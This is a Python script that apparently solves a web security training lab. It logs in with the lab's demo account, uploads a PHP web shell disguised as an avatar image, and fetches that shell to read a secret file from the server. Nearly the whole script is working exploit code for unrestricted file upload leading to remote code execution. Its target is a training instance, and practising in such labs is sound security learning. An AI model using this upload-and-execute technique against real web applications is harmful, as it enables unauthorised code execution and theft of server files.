import requests
from bs4 import BeautifulSoup
import re

site = "0af800ec037809568007530c00fe00e7.web-security-academy.net"  # Replace with actual instance
base_url = f"https://{site}"
s = requests.Session()

# Step 1: Get CSRF token from login page
login_url = f"{base_url}/login"
login_page = s.get(login_url)
soup = BeautifulSoup(login_page.text, "html.parser")
csrf = soup.find("input", {"name": "csrf"})["value"]

# Step 2: Log in as wiener
login_data = {
    "csrf": csrf,
    "username": "wiener",
    "password": "peter"
}
s.post(login_url, data=login_data)

# Step 3: Navigate to avatar upload page to re-grab CSRF (can differ from login)
account_page = s.get(f"{base_url}/my-account")
soup = BeautifulSoup(account_page.text, "html.parser")
csrf_upload = soup.find("input", {"name": "csrf"})["value"]

# Step 4: Upload web shell
upload_url = f"{base_url}/my-account/avatar"
multipart_form_data = {
    'csrf': (None, csrf_upload),
    'user': (None, 'wiener'),
    'avatar': ('secret.php', "<?php echo file_get_contents('/home/carlos/secret'); ?>")
}
resp = s.post(upload_url, files=multipart_form_data)
print("[*] Uploaded PHP shell.")

# Step 5: Trigger shell and extract secret
shell_url = f"{base_url}/files/avatars/secret.php"
resp = s.get(shell_url)
secret = resp.text.strip()
print(f"[✓] Extracted secret: {secret}")

# Step 6: Submit the secret to solve the lab
submit_url = f"{base_url}/submitSolution"
s.post(submit_url, data={"answer": secret})

# Step 7: Confirm lab completion
confirm = s.get(base_url)
if "Congratulations" in confirm.text:
    print("[✓] Lab successfully solved.")
else:
    print("[!] Submitted secret, but lab not marked as solved.")
